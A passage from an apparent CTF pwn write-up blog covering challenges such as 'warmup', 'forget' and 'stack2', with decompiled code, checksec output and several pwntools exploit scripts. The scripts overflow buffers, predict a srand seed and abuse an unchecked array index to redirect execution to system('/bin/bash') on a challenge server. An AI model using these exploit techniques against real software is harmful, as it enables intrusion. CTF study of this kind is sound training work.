result;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> __fastcall <span class="hljs-title">sub_B28</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [rsp+10h] [rbp-70h]</span><br>  FILE *stream; <span class="hljs-comment">// [rsp+78h] [rbp-8h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Congrats %s\n&quot;</span>, a1);<br>  stream = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-built_in">fgets</span>(&amp;s, <span class="hljs-number">100</span>, stream);<br>  <span class="hljs-built_in">puts</span>(&amp;s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">fflush</span>(stdout);<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs haml">-<span class="ruby"><span class="hljs-number">0000000000000050</span> buf             db <span class="hljs-number">55</span> dup(<span class="hljs-string">?)</span></span><br><span class="ruby"></span>-<span class="ruby">0000000000000019 flag            db ?</span><br><span class="ruby"></span>-<span class="ruby">0000000000000018 read_length     dq ?</span><br><span class="ruby"></span>-<span class="ruby"><span class="hljs-number">0000000000000010</span> seed            dd <span class="hljs-number">2</span> dup(<span class="hljs-string">?)</span></span><br><span class="ruby"></span>-<span class="ruby">0000000000000008                 db ? ; undefined</span><br><span class="ruby"></span>-<span class="ruby"><span class="hljs-number">0000000000000007</span>                 db ? ; undefined</span><br><span class="ruby"></span>-<span class="ruby"><span class="hljs-number">0000000000000006</span>                 db ? ; undefined</span><br><span class="ruby"></span>-<span class="ruby"><span class="hljs-number">0000000000000005</span>                 db ? ; undefined</span><br><span class="ruby"></span>-<span class="ruby"><span class="hljs-number">0000000000000004</span> count           dd ?</span><br><span class="ruby"></span>+0000000000000000  s              db 8 dup(?)<br></code></pre></td></tr></table></figure>

<p>EXP:</p>
<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span>*<br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>,<span class="hljs-string">&#x27;-x&#x27;</span>,<span class="hljs-string">&#x27;sh&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>]<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, <span class="hljs-built_in">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-built_in">io</span>=remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>,<span class="hljs-number">42284</span>)<br>libc=cdll.LoadLibrary(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br>payload=<span class="hljs-number">0x40</span>*<span class="hljs-string">&#x27;a&#x27;</span>+p64(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">io</span>.sendlineafter(<span class="hljs-string">&quot;let me know your name: &quot;</span>,payload)<br>libc.srand(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">50</span>):<br>      <span class="hljs-built_in">io</span>.sendlineafter(<span class="hljs-string">&quot;Give me the point(1~6): &quot;</span>,str(libc.rand()%<span class="hljs-number">6</span>+<span class="hljs-number">1</span>))<br><br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="forget"><a href="#forget" class="headerlink" title="forget"></a>forget</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br>  <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>  <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>  <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>  <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure>

<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-built_in">io</span>=remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>,<span class="hljs-number">59133</span>)<br>cat_flag=<span class="hljs-number">0x080486CC</span><br><span class="hljs-built_in">io</span>.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>)<br>payload=<span class="hljs-number">32</span>*<span class="hljs-string">&#x27;A&#x27;</span>+p32(cat_flag)<br><span class="hljs-built_in">io</span>.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,payload)<br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">context</span>(arch = &#x27;amd<span class="hljs-number">64</span>&#x27;, os = &#x27;linux&#x27;)<br><span class="hljs-attribute">sh</span> = remote(&#x27;<span class="hljs-number">111.198.29.45</span>&#x27;,<span class="hljs-number">31012</span>)<br><span class="hljs-attribute">cat_flag</span> = <span class="hljs-number">0</span>x<span class="hljs-number">40060</span>d<br><span class="hljs-attribute">sh</span>.sendline(&#x27;A&#x27; * <span class="hljs-number">72</span> + p<span class="hljs-number">64</span>(cat_flag))<br><span class="hljs-attribute">sh</span>.interactive()<br><br><br></code></pre></td></tr></table></figure>



<h2 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br>  <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>  <span class="hljs-attr">Stack:</span>    <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><br>  <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>  <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure>

<p>开了NX，canary</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// [esp+18h] [ebp-90h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [esp+1Ch] [ebp-8Ch]</span><br>  <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// [esp+20h] [ebp-88h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> j; <span class="hljs-comment">// [esp+24h] [ebp-84h]</span><br>  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// [esp+28h] [ebp-80h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [esp+2Ch] [ebp-7Ch]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> k; <span class="hljs-comment">// [esp+30h] [ebp-78h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> l; <span class="hljs-comment">// [esp+34h] [ebp-74h]</span><br>  <span class="hljs-keyword">char</span> v13[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+38h] [ebp-70h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v14; <span class="hljs-comment">// [esp+9Ch] [ebp-Ch]</span><br><br>  v14 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">setvbuf</span>(stdin, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  v9 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;***********************************************************&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;*                      An easy calc                       *&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;*Give me your numbers and I will return to you an average *&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;*(0 &lt;= x &lt; 256)                                           *&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;***********************************************************&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;How many numbers you have:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v5);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Give me your numbers&quot;</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v5 &amp;&amp; (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)i &lt;= <span class="hljs-number">99</span>; ++i )<br>  &#123;<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v7);<br>    v13[i] = v7;<br>  &#125;<br>  <span class="hljs-keyword">for</span> ( j = v5; ; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;average is %.2lf\n&quot;</span>, (<span class="hljs-keyword">double</span>)((<span class="hljs-keyword">long</span> <span class="hljs-keyword">double</span>)v9 / (<span class="hljs-keyword">double</span>)j)) )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>      &#123;<br>        <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit&quot;</span>);<br>          __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v6);<br>          <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">2</span> )<br>            <span class="hljs-keyword">break</span>;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Give me your number&quot;</span>);<br>          __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v7);<br>          <span class="hljs-keyword">if</span> ( j &lt;= <span class="hljs-number">0x63</span> )<br>          &#123;<br>            v3 = j++;<br>            v13[v3] = v7;<br>          &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ( v6 &gt; <span class="hljs-number">2</span> )<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">1</span> )<br>          <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;id\t\tnumber&quot;</span>);<br>        <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt; j; ++k )<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\t\t%d\n&quot;</span>, k, v13[k]);<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">3</span> )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;which number to change:&quot;</span>);<br>      __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v5);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;new number:&quot;</span>);<br>      __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v7);<br>      v13[v5] = v7;<span class="hljs-comment">//这里V5,V7没做任何检查，所以可以任意写了</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">4</span> )<br>      <span class="hljs-keyword">break</span>;<br>    v9 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> ( l = <span class="hljs-number">0</span>; l &lt; j; ++l )<br>      v9 += v13[l];<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>用IDA动态调试</p>
<p>直接在main的ret下断点，得到esp:FFF17E6C,输入了9 8 7 6 5 4 3 2 1 1</p>
<p>栈排布：</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs markdown">[<span class="hljs-symbol">stack</span>]:<span class="hljs-link">FFF17DE8 db    9        low</span><br>[<span class="hljs-symbol">stack</span>]:<span class="hljs-link">FFF17DE9 db    8</span><br>[<span class="hljs-symbol">stack</span>]:<span class="hljs-link">FFF17DEA db    7</span><br>[<span class="hljs-symbol">stack</span>]:<span class="hljs-link">FFF17DEB db    6</span><br>[<span class="hljs-symbol">stack</span>]:<span class="hljs-link">FFF17DEC db    5</span><br>[<span class="hljs-symbol">stack</span>]:<span class="hljs-link">FFF17DED db    4</span><br>[<span class="hljs-symbol">stack</span>]:<span class="hljs-link">FFF17DEE db    3</span><br>[<span class="hljs-symbol">stack</span>]:<span class="hljs-link">FFF17DEF db    2</span><br>[<span class="hljs-symbol">stack</span>]:<span class="hljs-link">FFF17DF0 db    1</span><br>[<span class="hljs-symbol">stack</span>]:<span class="hljs-link">FFF17DF1 db    1         high</span><br></code></pre></td></tr></table></figure>

<p>0xFFF17DE8-0xFFF17E6C=0x84=132</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><br><span class="hljs-attribute">g_local</span>=False<br><span class="hljs-attribute">context</span>.log_level=&#x27;debug&#x27;<br><br><span class="hljs-attribute">if</span> g_local:<br>	<span class="hljs-attribute">sh</span> = process(&#x27;./stack<span class="hljs-number">2</span>&#x27;)#env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.<span class="hljs-number">6</span>&#x27;&#125;<br>	<span class="hljs-attribute">gdb</span>.attach(sh)<br><span class="hljs-attribute">else</span>:<br>	<span class="hljs-attribute">sh</span> = remote(<span class="hljs-string">&quot;111.198.29.45&quot;</span>, <span class="hljs-number">31906</span>)<br><br><span class="hljs-attribute">def</span> write_byte(<span class="hljs-literal">off</span>, val):<br>	<span class="hljs-attribute">sh</span>.send(<span class="hljs-string">&quot;3\n&quot;</span>)<br>	<span class="hljs-attribute">sh</span>.recvuntil(<span class="hljs-string">&quot;which number to change:\n&quot;</span>)<br>	<span class="hljs-attribute">sh</span>.send(str(<span class="hljs-literal">off</span>) + <span class="hljs-string">&quot;\n&quot;</span>)<br>	<span class="hljs-attribute">sh</span>.recvuntil(<span class="hljs-string">&quot;new number:\n&quot;</span>)<br>	<span class="hljs-attribute">sh</span>.send(str(val) + <span class="hljs-string">&quot;\n&quot;</span>)<br>	<span class="hljs-attribute">sh</span>.recvuntil(<span class="hljs-string">&quot;5. exit\n&quot;</span>)<br><br><span class="hljs-attribute">def</span> write_dword(<span class="hljs-literal">off</span>, val):<br>	<span class="hljs-attribute">write_byte</span>(<span class="hljs-literal">off</span>, val &amp; <span class="hljs-number">0</span>xff)<br>	<span class="hljs-attribute">write_byte</span>(<span class="hljs-literal">off</span> + <span class="hljs-number">1</span>, (val &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0</span>xff)<br>	<span class="hljs-attribute">write_byte</span>(<span class="hljs-literal">off</span> + <span class="hljs-number">2</span>, (val &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0</span>xff)<br>	<span class="hljs-attribute">write_byte</span>(<span class="hljs-literal">off</span> + <span class="hljs-number">3</span>, (val &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0</span>xff)<br><br><span class="hljs-attribute">def</span> exit():<br>	<span class="hljs-attribute">sh</span>.send(<span class="hljs-string">&quot;5\n&quot;</span>)<br>	<span class="hljs-attribute">sh</span>.interactive()<br><br><span class="hljs-attribute">sh</span>.recvuntil(<span class="hljs-string">&quot;How many numbers you have:\n&quot;</span>)<br><span class="hljs-attribute">sh</span>.send(<span class="hljs-string">&quot;1\n&quot;</span>)<br><span class="hljs-attribute">sh</span>.recvuntil(<span class="hljs-string">&quot;Give me your numbers\n&quot;</span>)<br><span class="hljs-attribute">sh</span>.send(<span class="hljs-string">&quot;1\n&quot;</span>)<br><span class="hljs-attribute">sh</span>.recvuntil(<span class="hljs-string">&quot;5. exit\n&quot;</span>)<br><br><span class="hljs-attribute">write_dword</span>(<span class="hljs-number">0</span>x<span class="hljs-number">84</span>, <span class="hljs-number">0</span>x<span class="hljs-number">8048450</span>)<br><span class="hljs-attribute">write_dword</span>(<span class="hljs-number">0</span>x<span class="hljs-number">8</span>C, <span class="hljs-number">0</span>x<span class="hljs-number">8048980</span> + <span class="hljs-number">7</span>)<br><span class="hljs-attribute">exit</span>()<br></code></pre></td></tr></table></figure>



<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"># stack2_1.py<br><br>from pwn import *<br><br># a = process(<span class="hljs-emphasis">&#x27;./stack2&#x27;</span>)<br><br>a = remote(&quot;111.198.29.45&quot;, &quot;42691&quot;)<br><br>#system_addr = 0x8048450<br><br># off_addr = 0x9c<br><br># a.send(<span class="hljs-emphasis">&#x27;1\n1\n3\n156\n80\n3\n157\n132\n3\n158\n4\n3\n159\n8\n5\n&#x27;</span>)<br><br># a.interactive()<br><br>a.sendline(<span class="hljs-emphasis">&#x27;1\n5\n3\n132\n80\n3\n133\n132\n3\n134\n4\n3\n135\n8&#x27;</span>)<br>&#x27;&#x27;&#x27;<br>0x08048450<br><span class="hljs-title">.plt:08048450 ; int system(const char *command)</span><br>#80/132/4/8<br>&#x27;&#x27;&#x27;<br>a.sendline(<span class="hljs-emphasis">&#x27;3\n140\n135\n3\n141\n137\n3\n142\n4\n3\n143\n8&#x27;</span>)<br>&#x27;&#x27;&#x27;<br>0x08048987<br>08048980  2F 62 69 6E 2F 62 61 73  68 00 00 00 2A 2A 2A 2A  /bin/bash...<span class="hljs-strong">***</span>*<br>#135/137/4/8<br>&#x27;&#x27;&#x27;<br>a.sendline(<span class="hljs-emphasis">&#x27;5&#x27;</span>)<br><br>a.interactive()<br></code></pre></td></tr></table></figure>



<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs lsl">from pwn import *<br>context.log_level=&#x27;debug&#x27;<br>p=remote(&#x27;<span class="hljs-number">111.198</span><span class="hljs-number">.29</span><span class="hljs-number">.45</span>&#x27;,<span class="hljs-number">42691</span>)<br>p.recvuntil(<span class="hljs-string">&quot;have:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.sendline(&#x27;<span class="hljs-number">1</span>&#x27;)<br>p.recvuntil(<span class="hljs-string">&quot;numbers<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;115<span class="hljs-subst">\n</span>&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;exit<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;3&quot;</span>+<span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;change:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;132&quot;</span>+<span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;number:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;180&quot;</span>+<span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;exit<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;3&quot;</span>+<span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;change:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;133&quot;</span>+<span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;number:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;133&quot;</span>+<span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;exit<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;3<span class="hljs-subst">\n</span>&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;change:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;134&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;number:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;exit<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;3<span class="hljs-subst">\n</span>&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;change:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;135&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;number:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;8&quot;</span>)<br>#<span class="hljs-number">0x080485b4</span>   <span class="hljs-number">080485</span>B4                 call    _system<br>p.recvuntil(<span class="hljs-string">&quot;exit<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;3&quot;</span>+<span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;change:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;136&quot;</span>+<span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;number:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.sendline(&#x27;<span 